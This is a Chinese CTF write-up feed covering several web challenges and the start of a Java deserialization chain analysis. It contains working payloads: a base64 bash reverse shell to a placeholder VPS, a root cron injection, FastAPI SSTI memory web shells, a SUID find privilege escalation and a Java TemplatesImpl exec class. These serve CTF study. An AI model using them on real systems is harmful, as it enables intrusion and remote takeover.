class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;submit_id.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/sandbox&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;submit_code.html&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no id&#x27;</span><br>        user_id = session[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">in</span> working_id:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;task is still running&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            working_id.append(user_id)<br>            code = request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>)<br>            os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;sudo -u www-data cp /app/init.py /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/init.py &amp;&amp; cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u www-data python3 init.py&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;rm -rf /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>).read()<br>            <br>            php_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/sandbox/<span class="hljs-subst">&#123;user_id&#125;</span>/phpcode&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>            php_file.write(code)<br>            php_file.close()<br><br>            result = os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; sudo -u nobody php phpcode&#x27;</span>).read()<br>            os.popen(<span class="hljs-string">f&#x27;cd /sandbox/<span class="hljs-subst">&#123;user_id&#125;</span> &amp;&amp; rm *&#x27;</span>).read()<br>            working_id.remove(user_id)<br><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>其实这道题不算难，做法也很多，共同点是利用<code>rm *</code>无法删除文件夹的性质，就可以实现在一个沙箱里条件竞争，把另一个沙箱的init.py重写，然后触发init.py。</p><p>我是用的重写init.py反弹shell，拿到www-data权限：</p><p>开个沙箱EDDIE123和EDDIE321，在沙箱EDDIE123中执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm /sandbox/EDDIE321/init.py &amp;&amp; echo &#x27;CmltcG9ydCBvczsKb3MucG9wZW4oImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvdnBzL3BvcnQgMD4mMSciKQ==&#x27; | base64 -d &gt; /sandbox/EDDIE321/init.py&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>while(1)是用作循环竞争，使得init.py必然能重写。</p><p>然后在EDDIE321中随便执行个echo，按照代码逻辑就能走到<code>sudo -u www-data python3 init.py</code>，从而实现反弹shell：</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819154938430.png" alt="image-20240819154938430"></p><p>ps -aux发现root权限开启了cron，那么我们就想到写定时任务进去，<code>chmod 777 /flag</code>然后读就完事了。</p><p>首先是把&#x2F;etc&#x2F;cron.d与另外一个沙箱（这里我还创了个EDDIECRY）软链接，从而下面创建phpcode的时候就能把定时任务写进去。</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819163527316.png" alt="image-20240819163527316"></p><p>即在EDDIECRY中写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># &lt;?php system(&#x27;sudo -l&#x27;); ?&gt;</span><br>* * * * * root <span class="hljs-built_in">chmod</span> 777 /flag<br></code></pre></td></tr></table></figure><p>phpcode内容加了⼀句php system 执行<code>sudo -l</code>, 这个是为了阻塞脚本的执行, 使得cron有足够的时间调度计划任务。当然我们也试了while(1)的竞争，但是好像效果不太好emmm，其实也可以写<code>&lt;?php sleep(1000);?&gt;</code>这种达到效果。</p><p>此处当然也可以再次反弹shell，拿到的就是root权限。</p><p>等待一段时间，cat &#x2F;flag就完了。</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819163534524.png" alt="image-20240819163534524"></p><h2 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h2><p>fastapi的ssti，不出网，过滤数字和%，无回显打内存马。</p><p>因为这里用的是fastapi，所以不能用add_url_rule添加内存马，得用add_api_route添加内存马：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> url = <span class="hljs-string">&#x27;http://eci</span><br><span class="hljs-string">2ze870nxuud7kn92ktzy.cloudeci1.ichunqiu.com:8000/calc&#x27;</span><br> <span class="hljs-comment"># url = &#x27;http://127.0.0.1:8000/calc&#x27;</span><br> payload = <br><span class="hljs-string">r&#x27;&#x27;&#x27;app.routes[(dict(e=a)|join|count)].__class__.__init__.__builtins_</span><br><span class="hljs-string"> _[&#x27;eval&#x27;](&quot;app.add_api_route(&#x27;/shell&#x27;, lambda x: </span><br><span class="hljs-string">__import__(&#x27;os&#x27;).popen(x).read())&quot;, &#123;&#x27;app&#x27;:app&#125;)&#x27;&#x27;&#x27;</span><br> resp = requests.get(url, params=&#123;<span class="hljs-string">&#x27;calc_req&#x27;</span>: payload&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><p>payload有很多，也可以（来自[<a href="https://mp.weixin.qq.com/s/rQj3h-CTakLSMppuz0tCKg">随手分享]2024巅峰极客初赛 部分Web (qq.com)</a>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">undefinded.__class__.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_api_route(&#x27;/flag&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后访问 &#x2F;shell?x&#x3D;cat &#x2F;flag就可以了。</p><p>这里其实还可以用静态目录的方法。</p><p>在 FastAPI 中，app.mount() 用来为静态文件指定一个路径。例如，通过 app.mount(“&#x2F;static”, StaticFiles(directory&#x3D;”static”), name&#x3D;”static”) 将静态文件路径设置为 “static” 目录。</p><p>那么我们就可以尝试将静态文件目录改为根目录再读flag，payload来自<a href="https://mp.weixin.qq.com/s/CTcT5j8wYE0UmcLlMwVPsw">2024巅峰极客挑战赛—WriteUp By EDISEC (qq.com)</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.mount(<span class="hljs-string">&#x27;/static&#x27;</span>, lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;starlette.staticfiles&#x27;</span>).staticfiles.StaticFiles(directory=<span class="hljs-string">&#x27;/&#x27;</span>), name=<span class="hljs-string">&#x27;static&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后访问<code>&lt;url&gt;/static/flag</code>交了。</p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>黑盒，给了一个base64的反序列化入口，hint是jdk17+CB链。</p><p>如果只有个CB链当然很简单，工具都能一把梭。但是套了个jdk17。</p><p>看了NU1L战队的wp后，才知道实际上新版本<code>commons-beanutils</code>⼀般会同时带上<code>commons collections</code>。</p><p>而且题目不出网，所以要打一个内存马进去。</p><p>题目会在反序列化前过滤<code>org.apache</code>开头的类, 但发现可以用<code>utf-8 overlong encoding</code>绕过。</p><p><code>utf-8 overlong encoding</code>参考:</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8OverlongEncoding/UTF8OverlongObjectOutputStream.java">JYso&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;qi4l&#x2F;jndi&#x2F;gadgets&#x2F;utils&#x2F;utf8OverlongEncoding&#x2F;UTF8OverlongObjectOutputStream.java at master · qi4L&#x2F;JYso (github.com)</a></p><p>所以如此打个CC链就出了。</p><p>EXP可在NU1L公众号里查看，这里就不给出了。</p><h2 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h2><p>前台可以弱密码<code>admin/qwe123!@#</code>，但是也可以直接绕了。</p><p>访问&#x2F;admin.html可以直接拿到文件上传的操作页面：</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819174151906.png" alt="image-20240819174151906"></p><p>fuzz一下执行命令处的ban位，发现可用字符为t、*、.、&#x2F;以及各种数字。</p><p>这里容易想到临时文件执行，用到<code>./t*/*</code>的payload，直接就出了。</p><p>比如上传一个1.png，内容为</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>执行命令处使用<code>./t*/*</code>，发现权限为ctf。</p><p>如法炮制，suid提权发现find可用，直接find提权交了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">touch</span> /tmp/test &amp;&amp; find /tmp/test -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure><h2 id="old-api"><a href="#old-api" class="headerlink" title="old_api"></a>old_api</h2><p>又是jdk17。</p><p>这道其实挺可惜的，学长的本地docker通了，但是远程不出网，没来得及写内存马，所以没交上。</p><p>给了c3p0和h2的依赖，源码量很大，访问页面也就是api操作页面，审计源码发现v1的AdminController#importPost存在readObject，这里应该就是反序列化入口点。</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819175127207.png" alt="image-20240819175127207"></p><p>结合题目信息，很容易想到这道题两个步骤，第一步是绕过v2访问到v1的这个方法触发readObject，第二步是打H2的jdbc反序列化，这里用的就是Jackson-h2的链子。</p><p>而且jdk17一般来说都是出的JDBC打法，从几个月前的AliyunCTF-Chain17就可见一斑。</p><p>第一步绕过也不算太难，21级的SE学长给出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>base = <span class="hljs-string">&quot;http://localhost:8081/&quot;</span><br><br>session = requests.Session()<br><br>r = session.post(base + <span class="hljs-string">&quot;/public/register&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>r = session.post(base + <span class="hljs-string">&quot;/public/login&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>r = session.post(base + <span class="hljs-string">&quot;/..;/v1/admin/post/import&quot;</span>, data=&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: <span class="hljs-string">&quot;Sakura&quot;</span><br>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>也就是用<code>/..;/v1/admin/post/import</code>可以绕过。</p><p>接下来就是Jackson + H2的JDBC手法。</p><p>（未完待续）</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java_Unser-重走八十一难</title>
    <link href="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/"/>
    <url>/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前java基础不牢，只能AWDP修一修，现在学的个七七八八了，还得刺刀见红。</p><p>以前做过几个java，但是基本都是抄exp，没有什么gadget的认知，这次重走八十一难，必证菩提金身。</p><h2 id="CISCN2023-初赛-DeserBug"><a href="#CISCN2023-初赛-DeserBug" class="headerlink" title="[CISCN2023 初赛]-DeserBug"></a>[CISCN2023 初赛]-DeserBug</h2><p>算我的java反序列化启蒙题之一。这道题是当年的初赛题目，现在看来难度不算太高。</p><p>hint：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept<br></code></pre></td></tr></table></figure><p>附件除了DeserBug环境jar包，还给了commons-collections-3.2.2和hutool-5.8.18的jar包。</p><p>值得注意的是CC链自3.2.1后新添加了checkUnsafeSerialization功能对反序列化内容进行检测，而CC链常用到的InvokerTransformer就列入了黑名单中。所以直接打CC链肯定不行。</p><p>而且题目提示了从<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>的部分gadget，那我们就却之不恭了。</p><p>首先看看题目啥玩意，Testapp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.app;<br><br><span class="hljs-keyword">import</span> cn.hutool.http.ContentType;<br><span class="hljs-keyword">import</span> cn.hutool.http.HttpUtil;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Testapp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Testapp</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        HttpUtil.createServer(<span class="hljs-number">8888</span>).addAction(<span class="hljs-string">&quot;/&quot;</span>, (request, response) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">bugstr</span> <span class="hljs-operator">=</span> request.getParam(<span class="hljs-string">&quot;bugstr&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (bugstr == <span class="hljs-literal">null</span>) &#123;<br>                response.write(<span class="hljs-string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);<br>                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode));<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> inputStream.readObject();<br>                result = object.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var8;<br>                <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>                myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;);<br>                myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;e.toString()&#125;);<br>                myexpect.setTargetclass(e.getClass());<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    result = myexpect.getAnyexcept().toString();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                    <span class="hljs-type">Exception</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> var7;<br>                    result = ex.toString();<br>                &#125;<br>            &#125;<br><br>            response.write(result, ContentType.TEXT_PLAIN.toString());<br>        &#125;).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传参<code>bugstr</code>，值为base64编码后的序列化字节，打反序列化的位置也很显然，也没重写ObjectInputStream这种加WAF。</p><p>现在就只需要把链子分析出来就可以了。</p><h3 id="前半缝合-CC6"><a href="#前半缝合-CC6" class="headerlink" title="前半缝合-CC6"></a>前半缝合-CC6</h3><p>根据题目提示，来到：</p><p><code>cn.hutool.json.JSONObject.put</code>：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813000442240.png" alt="image-20240813000442240"></p><p>没啥特殊，就一个普通的键值对赋值。</p><p>其实可以结合CC链依赖想到CC6的lazymap.get()经典方法（其实CC3也是CC6改良而来的）：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813002641896.png" alt="image-20240813002641896"></p><p>不妨设想一下，如果</p><ul><li>super.map是一个JSONObject</li><li>key无所谓</li><li>value是一个Transformer的子类,如<code>ConstantTransformer</code></li></ul><p>如其所示，只要iConstant是个Object，我们就能调用他的getter方法：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813003154650.png" alt="image-20240813003154650"></p><p>只要令传入的map为JSONObject即可触发JSONObject#put，上面的分析已经得知value的值也是我们通过ConstantTransformer可控的，由此调用到它的getter方法。</p><p>那么这条链子的前半部分就通了（CC6）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>HashSet#readObject() =&gt;<br>HashMap#put() =&gt;<br>HashMap#hash() =&gt;<br>TiedMapEntry#hashCode() =&gt;<br>TiedMapEntry#getValue() =&gt;<br>LazyMap#get() =&gt;<br>cn.hutool.json.JSONObject.put<br></code></pre></td></tr></table></figure><h3 id="后半缝合-CC3"><a href="#后半缝合-CC3" class="headerlink" title="后半缝合-CC3"></a>后半缝合-CC3</h3><p>看看另一个：</p><p><code>com.app.Myexpect#getAnyexcept</code>：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813000748313.png" alt="image-20240813000748313"></p><p>使用一个构造器，触发对应类的newInstance()方法。</p><p>欸？这不CC3吗？能直接联想到<code>TrAXFilter</code>。</p><p>LINK：<a href="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/#CC3">Commons Collections - EddieMurphy’s blog (eddiemurphy89.github.io)</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813001032892.png" alt="image-20240813001032892"></p><p>这里用到<code>TrAXFilter</code>的构造方法，其实算是到CC3后半段，那么后续链子就有了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">com.app.Myexpect#getAnyexcept =&gt;<br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>接下来就是要找哪里调用了<code>getAnyexcept</code>，结合提示<code>cn.hutool.json.JSONObject.put</code>-&gt;<code>com.app.Myexpect#getAnyexcept</code>其实也很简单。</p><p>完整链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>HashSet#readObject() =&gt;<br>HashMap#put() =&gt;<br>HashMap#hash() =&gt;<br>TiedMapEntry#hashCode() =&gt;<br>TiedMapEntry#getValue() =&gt;<br>LazyMap#get() =&gt;<br><br>cn.hutool.json.JSONObject.put =&gt;<br>com.app.Myexpect#getAnyexcept =&gt;<br><br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>完美。</p><p>其实到这里也能发现，CC5也可以走，因为前半部分不受影响：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>    BadAttributeValueExpException#readObject() =&gt;<br>    TiedMapEntry#toString() =&gt;<br>    LazyMap#get() =&gt;<br>    <br>cn.hutool.json.JSONObject.put =&gt;<br>com.app.Myexpect#getAnyexcept =&gt;<br><br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>evil.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC6+CC3-EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 